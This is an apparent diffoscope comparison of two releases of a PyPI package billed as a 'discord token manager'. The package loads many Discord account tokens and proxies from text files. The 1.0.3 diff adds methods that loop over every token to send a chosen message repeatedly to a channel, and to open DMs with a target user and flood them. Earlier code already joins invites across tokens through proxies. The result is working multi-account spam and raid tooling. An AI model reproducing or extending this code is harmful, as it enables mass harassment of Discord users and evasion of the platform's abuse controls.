# Comparing `tmp/maxeqx-dc-token.py-1.0.2.tar.gz` & `tmp/maxeqx-dc-token.py-1.0.3.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "maxeqx-dc-token.py-1.0.2.tar", last modified: Fri May  5 09:13:51 2023, max compression
+gzip compressed data, was "maxeqx-dc-token.py-1.0.3.tar", last modified: Fri May  5 09:58:33 2023, max compression
```

## Comparing `maxeqx-dc-token.py-1.0.2.tar` & `maxeqx-dc-token.py-1.0.3.tar`

### file list

```diff
@@ -1,15 +1,15 @@
-drwxrwxrwx   0        0        0        0 2023-05-05 09:13:51.553842 maxeqx-dc-token.py-1.0.2/
--rw-rw-rw-   0        0        0     1051 2023-05-04 14:40:55.000000 maxeqx-dc-token.py-1.0.2/LICENSE.txt
--rw-rw-rw-   0        0        0       19 2023-05-04 14:44:57.000000 maxeqx-dc-token.py-1.0.2/MANIFEST.in
--rw-rw-rw-   0        0        0      619 2023-05-05 09:13:51.550341 maxeqx-dc-token.py-1.0.2/PKG-INFO
--rw-rw-rw-   0        0        0      520 2023-05-05 08:36:36.000000 maxeqx-dc-token.py-1.0.2/README.txt
-drwxrwxrwx   0        0        0        0 2023-05-05 09:13:51.545836 maxeqx-dc-token.py-1.0.2/maxeqx_dc_token.py.egg-info/
--rw-rw-rw-   0        0        0      619 2023-05-05 09:13:51.000000 maxeqx-dc-token.py-1.0.2/maxeqx_dc_token.py.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      273 2023-05-05 09:13:51.000000 maxeqx-dc-token.py-1.0.2/maxeqx_dc_token.py.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-05-05 09:13:51.000000 maxeqx-dc-token.py-1.0.2/maxeqx_dc_token.py.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       34 2023-05-05 09:13:51.000000 maxeqx-dc-token.py-1.0.2/maxeqx_dc_token.py.egg-info/requires.txt
--rw-rw-rw-   0        0        0        9 2023-05-05 09:13:51.000000 maxeqx-dc-token.py-1.0.2/maxeqx_dc_token.py.egg-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2023-05-05 09:13:51.547835 maxeqx-dc-token.py-1.0.2/maxtoken/
--rw-rw-rw-   0        0        0     5858 2023-05-05 09:13:02.000000 maxeqx-dc-token.py-1.0.2/maxtoken/__init__.py
--rw-rw-rw-   0        0        0       42 2023-05-05 09:13:51.554836 maxeqx-dc-token.py-1.0.2/setup.cfg
--rw-rw-rw-   0        0        0      793 2023-05-05 09:13:49.000000 maxeqx-dc-token.py-1.0.2/setup.py
+drwxrwxrwx   0        0        0        0 2023-05-05 09:58:33.408285 maxeqx-dc-token.py-1.0.3/
+-rw-rw-rw-   0        0        0     1051 2023-05-04 14:40:55.000000 maxeqx-dc-token.py-1.0.3/LICENSE.txt
+-rw-rw-rw-   0        0        0       19 2023-05-04 14:44:57.000000 maxeqx-dc-token.py-1.0.3/MANIFEST.in
+-rw-rw-rw-   0        0        0      619 2023-05-05 09:58:33.408285 maxeqx-dc-token.py-1.0.3/PKG-INFO
+-rw-rw-rw-   0        0        0      520 2023-05-05 08:36:36.000000 maxeqx-dc-token.py-1.0.3/README.txt
+drwxrwxrwx   0        0        0        0 2023-05-05 09:58:33.405518 maxeqx-dc-token.py-1.0.3/maxeqx_dc_token.py.egg-info/
+-rw-rw-rw-   0        0        0      619 2023-05-05 09:58:33.000000 maxeqx-dc-token.py-1.0.3/maxeqx_dc_token.py.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      273 2023-05-05 09:58:33.000000 maxeqx-dc-token.py-1.0.3/maxeqx_dc_token.py.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-05-05 09:58:33.000000 maxeqx-dc-token.py-1.0.3/maxeqx_dc_token.py.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       43 2023-05-05 09:58:33.000000 maxeqx-dc-token.py-1.0.3/maxeqx_dc_token.py.egg-info/requires.txt
+-rw-rw-rw-   0        0        0        9 2023-05-05 09:58:33.000000 maxeqx-dc-token.py-1.0.3/maxeqx_dc_token.py.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2023-05-05 09:58:33.407284 maxeqx-dc-token.py-1.0.3/maxtoken/
+-rw-rw-rw-   0        0        0     6993 2023-05-05 09:57:37.000000 maxeqx-dc-token.py-1.0.3/maxtoken/__init__.py
+-rw-rw-rw-   0        0        0       42 2023-05-05 09:58:33.408285 maxeqx-dc-token.py-1.0.3/setup.cfg
+-rw-rw-rw-   0        0        0      805 2023-05-05 09:50:10.000000 maxeqx-dc-token.py-1.0.3/setup.py
```

### Comparing `maxeqx-dc-token.py-1.0.2/LICENSE.txt` & `maxeqx-dc-token.py-1.0.3/LICENSE.txt`

 * *Files identical despite different names*

### Comparing `maxeqx-dc-token.py-1.0.2/PKG-INFO` & `maxeqx-dc-token.py-1.0.3/PKG-INFO`

 * *Files 21% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: maxeqx-dc-token.py
-Version: 1.0.2
+Version: 1.0.3
 Summary: This is simple discord token manager.
 Home-page: 
 Author: maxeqx
 Author-email: maxeqxmail@gmail.com
 License: MIT
 Keywords: discord token manager
 Classifier: Development Status :: 5 - Production/Stable
```

### Comparing `maxeqx-dc-token.py-1.0.2/README.txt` & `maxeqx-dc-token.py-1.0.3/README.txt`

 * *Files identical despite different names*

### Comparing `maxeqx-dc-token.py-1.0.2/maxeqx_dc_token.py.egg-info/PKG-INFO` & `maxeqx-dc-token.py-1.0.3/maxeqx_dc_token.py.egg-info/PKG-INFO`

 * *Files 21% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: maxeqx-dc-token.py
-Version: 1.0.2
+Version: 1.0.3
 Summary: This is simple discord token manager.
 Home-page: 
 Author: maxeqx
 Author-email: maxeqxmail@gmail.com
 License: MIT
 Keywords: discord token manager
 Classifier: Development Status :: 5 - Production/Stable
```

### Comparing `maxeqx-dc-token.py-1.0.2/maxtoken/__init__.py` & `maxeqx-dc-token.py-1.0.3/maxtoken/__init__.py`

 * *Files 18% similar despite different names*

```diff
@@ -1,17 +1,42 @@
 import aiohttp
 import asyncio
 from aioconsole import aprint
+import requests
 
 class DiscordToken():
     def __init__(self):
         with open('tokens.txt', 'r') as t:
             self.tokens : str = t.read().splitlines()
         with open('proxies.txt', 'r') as p:
             self.proxies : str = p.read().splitlines()
+    def channel_send(self, channel_id : int = 0, message : str = None, numberofmsg : int = 1):
+        tokens = self.tokens
+        for token in tokens:
+            for i in range(numberofmsg):
+                url = 'https://discord.com/api/v8/channels/{}/messages'.format(channel_id)
+                data = {"content": message}
+                header = {"authorization": token}
+                r = requests.post(url, data=data, headers=header)
+    def createdmchannel(self, user_id):
+        tokens = self.tokens
+        for token in tokens:
+            data = {"recipient_id": user_id}
+            headers = {"authorization": token}
+    
+            r = requests.post(f'https://discord.com/api/v9/users/@me/channels', json=data, headers=headers)
+    
+            channel_id = r.json()['id']
+    
+            return channel_id
+    def user_send(self, user_id : int = 0, message : str = None, numberofmsg : int = 1):
+        tokens = self.tokens
+        for token in tokens:
+            channel_id = self.createdmchannel(user_id)
+            self.channel_send(channel_id, message, numberofmsg)
     async def invite_join(self, invite_code : str = None):
         code = invite_code
         tokens = self.tokens
         proxies = self.proxies
         if len(proxies) > 0:
             for token, proxy in zip(tokens, proxies):
                 headers = {
```

### Comparing `maxeqx-dc-token.py-1.0.2/setup.py` & `maxeqx-dc-token.py-1.0.3/setup.py`

 * *Files 4% similar despite different names*

```diff
@@ -6,19 +6,19 @@
   'Operating System :: Microsoft :: Windows :: Windows 10',
   'License :: OSI Approved :: MIT License',
   'Programming Language :: Python :: 3'
 ]
  
 setup(
   name='maxeqx-dc-token.py',
-  version='1.0.2',
+  version='1.0.3',
   description='This is simple discord token manager.',
   long_description="Long description and usage is on my github: https://github.com/makseksowny/maxeqx-dc-webhook.",
   url='',  
   author='maxeqx',
   author_email='maxeqxmail@gmail.com',
   license='MIT', 
   classifiers=classifiers,
   keywords='discord token manager',
   packages=find_packages(),
-  install_requires=['aiohttp', 'asyncio', 'aioconsole', 'Brotli'] 
+  install_requires=['aiohttp', 'asyncio', 'aioconsole', 'Brotli', 'requests'] 
 )
```

